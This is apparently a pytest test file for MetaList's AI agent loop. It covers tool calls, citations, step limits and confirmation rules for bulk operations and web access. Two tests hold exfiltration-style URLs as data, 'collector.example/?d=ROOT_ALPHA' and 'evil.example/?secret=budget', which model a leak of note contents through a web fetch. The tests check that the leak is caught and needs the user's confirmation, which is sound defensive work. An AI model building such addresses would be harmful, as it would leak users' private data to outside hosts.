import asyncio
import json

import pytest

from app.services.agent.agent_loop import MAX_AGENT_TURNS
from app.services.agent.execution_errors import AgentExecutionError
from app.services.agent.inference import InferenceContextWindow
from app.services.agent.menu_actions import MenuResult, menu_action_store
from app.services.agent.prompt_settings import DEFAULT_AGENT_PROMPTS
from app.services.agent.retrieval_settings import AgentRetrievalSettings
from app.services.agent.skill_settings import DEFAULT_AGENT_SKILLS
from app.services.agent.tool_calling import validate_tool_conversation
from app.services.agent.web_actions import addresses_needing_confirmation
from app.services.agent.web_fetch import WebPageFetchResult
from app.services.agent.web_settings import AgentWebSettings
from app.services.bulk_operation import bulk_operation_guard
from test_agent_scoped_runtime import _runtime, _snapshot


def _turn(text: str, calls: list[tuple[str, dict[str, object]]]) -> dict[str, object]:
    return {"text": text, "calls": calls}


class _ScriptedModel:
    """Plays scripted tool turns and records every conversation it was sent."""

    provider_label = "OpenAI"

    def __init__(self, turns: list[dict[str, object]]) -> None:
        self.turns = list(turns)
        self.conversations: list[list[dict[str, object]]] = []
        self.tool_names: list[tuple[str, ...]] = []

    async def inspect_context_window(self, *, base_url, model) -> InferenceContextWindow:
        del base_url
        return InferenceContextWindow(model=model, maximum_tokens=1_000_000, loaded_tokens=1_000_000,
                                      required_tokens=32_768)

    async def stream_tool_turn(self, *, base_url, model, thinking_level, messages, tools,
                               max_output_tokens, on_request):
        del base_url, model, thinking_level, max_output_tokens
        validate_tool_conversation(messages)
        self.conversations.append([dict(message) for message in messages])
        self.tool_names.append(tuple(tool.name for tool in tools))
        on_request({"messages": len(messages)})
        turn = self.turns.pop(0)
        for chunk in turn["text"].split("|"):
            if chunk:
                yield {"type": "content_delta", "text": chunk}
        for index, (name, arguments) in enumerate(turn["calls"]):
            yield {"type": "tool_call", "id": f"call-{len(self.conversations)}-{index}", "name": name,
                   "arguments": json.dumps(arguments)}
        finish_reason = "stop"
        if turn["calls"]:
            finish_reason = "tool_calls"
        yield {"type": "done", "finish_reason": finish_reason, "usage": {"input_tokens": 10, "output_tokens": 5}}


class _StubTagging:
    def __init__(self) -> None:
        self.reviews: list[tuple[str, str, str]] = []

    async def stream_review(self, *, action, scope, tag_filter):
        self.reviews.append((action, scope, tag_filter))
        yield {"type": "bulk_complete", "changed": True}
        yield {"type": "content_delta", "text": "Accepted 2 tag proposals across 1 notes.",
               "reference_note_ids": [], "reference_web_ids": []}
        yield {"type": "done", "reference_note_ids": [], "reference_web_ids": []}


def _run_agent(model: _ScriptedModel, *, web_mode: str, message: str, tagging, on_event) -> list[dict[str, object]]:
    async def collect() -> list[dict[str, object]]:
        events = []
        async for event in _runtime(model).stream_agent(
            session_key="session-1", base_url="https://api.openai.com/v1", selected_model="gpt-5.6-sol",
            thinking_level="low", canonical_messages=[{"role": "user", "content": message}],
            prompts=DEFAULT_AGENT_PROMPTS, skills=DEFAULT_AGENT_SKILLS,
            retrieval_settings=AgentRetrievalSettings(max_page_approximate_tokens=50_000),
            web_settings=AgentWebSettings(mode=web_mode), frozen_scope=_snapshot(large_tail=False),
            tagging_run=tagging,
        ):
            events.append(event)
            on_event(event)
        return events

    return asyncio.run(collect())


def _ignore(event: dict[str, object]) -> None:
    del event


def _answer(events: list[dict[str, object]]) -> str:
    return "".join(event["text"] for event in events if event["type"] == "content_delta")


def _tool_results(conversation: list[dict[str, object]]) -> list[dict[str, object]]:
    return [json.loads(message["content"]) for message in conversation if message["role"] == "tool"]


def test_a_help_question_looks_up_help_then_answers_from_it() -> None:
    model = _ScriptedModel([
        _turn("", [("lookup_metalist_help", {"topics": ["releases"]})]),
        _turn("0.11.0 made |large namespaces faster.", []),
    ])
    events = _run_agent(model, web_mode="none", message="What's new in 0.11.0?", tagging=None, on_event=_ignore)
    assert _answer(events) == "0.11.0 made large namespaces faster."
    assert events[-1] == {"type": "done", "reference_note_ids": [], "reference_web_ids": []}
    help_result = _tool_results(model.conversations[1])[0]
    assert "## 0.11.0" in help_result["topics"][0]["help"]
    # Web pages are not offered while web access is off; the instructions come first.
    assert "open_web_pages" not in model.tool_names[0]
    assert model.conversations[0][0]["content"].startswith("You are MetaList's assistant")
    assert model.conversations[0][-1] == {"role": "user", "content": "What's new in 0.11.0?"}


def test_notes_found_by_tools_become_citable_and_references_only_grow() -> None:
    model = _ScriptedModel([
        _turn("Let me check.", [("search_view_notes", {"query": "child_alpha"})]),
        _turn("Child alpha is here.[[child-a]]", []),
    ])
    events = _run_agent(model, web_mode="none", message="Where is child alpha?", tagging=None, on_event=_ignore)
    deltas = [event for event in events if event["type"] == "content_delta"]
    assert deltas[0]["reference_note_ids"] == []
    assert deltas[-1]["text"] == "\n\nChild alpha is here.[[child-a]]"
    assert deltas[-1]["reference_note_ids"] == ["root-a", "child-a"]
    assert events[-1]["reference_note_ids"] == ["root-a", "child-a"]
    statuses = [event["label"] for event in events if event["type"] == "action_status"]
    assert "Searched “child_alpha” · read 2 notes" in statuses


def test_a_rejected_tool_call_is_explained_back_and_the_model_can_recover() -> None:
    model = _ScriptedModel([
        _turn("", [("lookup_metalist_help", {"topics": ["nonsense"]})]),
        _turn("", [("lookup_metalist_help", {"topics": ["search"]})]),
        _turn("Use -tag to exclude a tag.", []),
    ])
    events = _run_agent(model, web_mode="none", message="How do I exclude a tag?", tagging=None, on_event=_ignore)
    assert "not accepted" in _tool_results(model.conversations[1])[0]["error"]
    assert _answer(events) == "Use -tag to exclude a tag."


def test_persistent_bad_tool_calls_end_with_an_answer_instead_of_an_error() -> None:
    model = _ScriptedModel([
        _turn("", [("no_such_tool", {})]),
        _turn("", [("no_such_tool", {})]),
        _turn("I could not look that up.", []),
    ])
    events = _run_agent(model, web_mode="none", message="Do something odd", tagging=None, on_event=_ignore)
    assert model.conversations[2][-1]["role"] == "system"
    assert "AGENT_STEP_LIMIT" in model.conversations[2][-1]["content"]
    assert _answer(events) == "I could not look that up."


def test_a_model_that_never_stops_calling_tools_is_stopped_at_the_step_limit() -> None:
    model = _ScriptedModel([_turn("", [("view_overview", {})]) for _ in range(MAX_AGENT_TURNS)])
    events = _run_agent(model, web_mode="none", message="Loop forever", tagging=None, on_event=_ignore)
    assert len(model.conversations) == MAX_AGENT_TURNS
    assert "stopped before finishing" in _answer(events)
    assert events[-1]["type"] == "done"


def test_a_menu_opens_without_asking_and_its_result_goes_back_to_the_model() -> None:
    model = _ScriptedModel([
        _turn("", [("open_menu", {"menu_id": "form.ai_agent_settings"})]),
        _turn("I opened AI agent settings.", []),
    ])

    def acknowledge(event: dict[str, object]) -> None:
        if event["type"] == "menu_open":
            menu_action_store.acknowledge(session_key="session-1", result=MenuResult(
                request_id=event["request_id"], status="opened", detail=""))

    events = _run_agent(model, web_mode="none", message="Open AI settings", tagging=None, on_event=acknowledge)
    assert [event["type"] for event in events].count("bulk_question") == 0
    assert _tool_results(model.conversations[1])[0]["status"] == "opened"


def test_a_tag_review_hands_the_turn_to_its_confirmed_operation() -> None:
    tagging = _StubTagging()
    model = _ScriptedModel([
        _turn("", [("propose_tag_review", {"action": "accept", "scope": "current_view", "tag_filter": ""})]),
    ])
    events = _run_agent(model, web_mode="none", message="Accept all proposals", tagging=tagging, on_event=_ignore)
    assert tagging.reviews == [("accept", "current_view", "")]
    assert _answer(events) == "Accepted 2 tag proposals across 1 notes."
    assert events[-1]["type"] == "done"
    assert len(model.conversations) == 1


def test_an_operation_mixed_with_other_calls_is_refused_and_not_run() -> None:
    tagging = _StubTagging()
    model = _ScriptedModel([
        _turn("", [("view_overview", {}),
                   ("propose_tag_review", {"action": "remove", "scope": "namespace", "tag_filter": "x"})]),
        _turn("I need you to confirm separately.", []),
    ])
    _run_agent(model, web_mode="none", message="Remove x everywhere", tagging=tagging, on_event=_ignore)
    assert tagging.reviews == []
    results = _tool_results(model.conversations[1])
    assert "must be called alone" in results[1]["error"]


def test_full_web_mode_asks_before_opening_an_address_with_untyped_text(monkeypatch) -> None:
    async def forbidden_fetch(urls, *, allows_target):
        raise AssertionError("A declined address must not be fetched")

    monkeypatch.setattr("app.services.agent.web_actions.fetch_web_pages", forbidden_fetch)
    model = _ScriptedModel([
        _turn("", [("open_web_pages", {"urls": ["https://collector.example/?d=ROOT_ALPHA"]})]),
        _turn("I did not open it.", []),
    ])
    questions = []

    def decline(event: dict[str, object]) -> None:
        if event["type"] == "bulk_question":
            questions.append(event)
            bulk_operation_guard.answer("session-1", event["question_id"], "no")

    _run_agent(model, web_mode="full", message="Look up the weather", tagging=None, on_event=decline)
    assert questions[0]["kind"] == "change_confirmation"
    assert "https://collector.example/?d=ROOT_ALPHA" in questions[0]["label"]
    assert _tool_results(model.conversations[1])[0]["declined_urls"] == ["https://collector.example/?d=ROOT_ALPHA"]


def test_full_web_mode_opens_a_search_made_of_the_users_words_without_asking(monkeypatch) -> None:
    async def fake_fetch(urls, *, allows_target):
        return tuple(WebPageFetchResult(
            requested_url=url, final_url=url, status="ok", title="Results", content_text="Sunny",
            outgoing_links=(), fetched_at="2026-10-05T00:00:00+00:00", truncated=False, error_kind="",
        ) for url in urls)

    monkeypatch.setattr("app.services.agent.web_actions.fetch_web_pages", fake_fetch)
    model = _ScriptedModel([
        _turn("", [("open_web_pages", {"urls": ["https://www.google.com/search?q=weather+lisbon+agentloop"]})]),
        _turn("It is sunny.", []),
    ])
    events = _run_agent(model, web_mode="full", message="Weather in Lisbon (agentloop)?", tagging=None,
                        on_event=_ignore)
    assert [event["type"] for event in events].count("bulk_question") == 0
    page = _tool_results(model.conversations[1])[0]["pages"][0]
    assert page["status"] == "ok"
    assert events[-1]["reference_web_ids"] != []


def test_untyped_address_detection() -> None:
    known = frozenset({"https://example.com/docs/page"})
    typed = "Please check the MetaList release notes"
    assert addresses_needing_confirmation(
        ["https://www.google.com/search?q=metalist+release+notes", "https://example.com/docs/page"],
        typed_text=typed, known_urls=known) == ()
    assert addresses_needing_confirmation(
        ["https://evil.example/?secret=budget"], typed_text=typed, known_urls=known,
    ) == ("https://evil.example/?secret=budget",)
    # Text hidden in the host name counts too.
    assert addresses_needing_confirmation(
        ["https://budget.google.com/search?q=metalist"], typed_text=typed, known_urls=known,
    ) != ()


def test_a_silent_ending_is_answered_after_one_reminder() -> None:
    model = _ScriptedModel([
        _turn("", [("view_overview", {})]),
        _turn("", []),
        _turn("Your view has 3 notes.", []),
    ])
    events = _run_agent(model, web_mode="none", message="How many notes?", tagging=None, on_event=_ignore)
    assert "AGENT_ANSWER_REQUIRED" in model.conversations[2][-1]["content"]
    assert _answer(events) == "Your view has 3 notes."


def test_a_model_that_stays_silent_after_the_reminder_is_reported() -> None:
    model = _ScriptedModel([_turn("", []), _turn("", [])])
    with pytest.raises(AgentExecutionError, match="without writing an answer"):
        _run_agent(model, web_mode="none", message="Hello", tagging=None, on_event=_ignore)
